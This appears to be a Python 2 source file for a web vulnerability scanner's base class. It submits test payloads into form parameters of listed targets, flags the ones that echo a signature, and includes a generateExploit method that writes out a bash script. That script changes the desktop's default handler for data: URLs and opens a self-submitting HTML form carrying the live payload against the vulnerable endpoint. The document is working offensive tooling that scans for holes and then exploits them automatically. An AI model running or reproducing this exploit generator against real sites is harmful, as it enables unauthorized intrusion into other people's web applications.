import logging
import json
from urllib2 import urlopen, unquote

import sys
sys.path.append('..')
from config import LOG_LEVEL

logging.basicConfig(stream=sys.stdout)

class Scanner(object):
    className = 'Scanner'
    payloads = []
    testPayload = ''
    testSignature = ''
    fixedSignature = ''
    realPayload = ''

    def __init__(self, targetsFile):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.logger.setLevel(logging.getLevelName(LOG_LEVEL))
        with open(targetsFile) as json_file:
            self.targets = json.load(json_file)

    def _urlopen(self, target, data):
        data = '&'.join(['%s=%s' % (key, data[key]) for key in data])
        if target['method'] == 'GET':
            resp = urlopen(target['action'] + '?' + data)
        else:
            resp = urlopen(target['action'], data=data)
        return resp.read()

    def _vulnerable(self, target, data, signature=''):
        try:
            return self._urlopen(target, data).find(
                    signature or self.testSignature) > -1
        except:
            return False

    def loadPayload(self, payload, target):
        if payload.find('%s') > -1:
            return (payload % self.testPayload, payload % self.realPayload,
                    self.testSignature)
        else:
            return (payload, payload, self.fixedSignature)

    def scanVulnerabilities(self):
        results = { 'class': self.className, 'results': {} }
        for target in self.targets:
            url = target['action'].split('//')
            domain = url[0] + '//' + \
                    url[-1].split('?')[0].split('#')[0].split('/')[0]
            vulnerabilities = []
            for param in target['inputs']:
                params = { key['name']: '1' for key in target['inputs'] }
                for payload in self.payloads:
                    loadedTestPayload, loadedRealPayload, \
                            signature = self.loadPayload(payload, target)
                    # Check form with the single parameter
                    if self._vulnerable(target, {
                            param['name']: loadedTestPayload }, signature):
                        vulnerabilities.append({
                            'endpoint': target['action'][len(domain):],
                            'params': {
                                param['name']: loadedRealPayload },
                            'method': target['method']
                        })
                        break
                    # Check pre-dummy-filled form with the overridden parameter
                    params[param['name']] = loadedTestPayload
                    if self._vulnerable(target, params, signature):
                        params[param['name']] = loadedRealPayload
                        vulnerabilities.append({
                            'endpoint': target['action'][len(domain):],
                            'params': params,
                            'method': target['method']
                        })
                        break
                else: continue
                break
            if vulnerabilities:
                if domain not in results['results']:
                    results['results'][domain] = []
                results['results'][domain].extend(vulnerabilities)
        return results

    def generateExploit(self, domain, vulnerability):
        action = domain + vulnerability['endpoint']
        params = vulnerability['params']
        method = vulnerability['method']
        return '\n'.join([
            '#!/bin/bash',
            'xdg-mime default `xdg-mime query default x-scheme-handler/http` \
                    x-scheme-handler/data',
            '',
            'python <(cat <<\\EOF',
            'from urllib import quote',
            'import webbrowser',
            '',
            'html = \'<form method=%s action=%s>' % (method, action) + \
                    ''.join(['<input name=%s value="%s">' % (
                        k, unquote(params[k]).replace('\\', '\\\\').replace(
                            "'", "\\'")) for k in params]) + \
                    '</form><script>document.forms[0].submit()</script>\'',
            'webbrowser.open_new_tab("data:text/html," + quote(html))',
            'EOF',
            ')',
            ''])
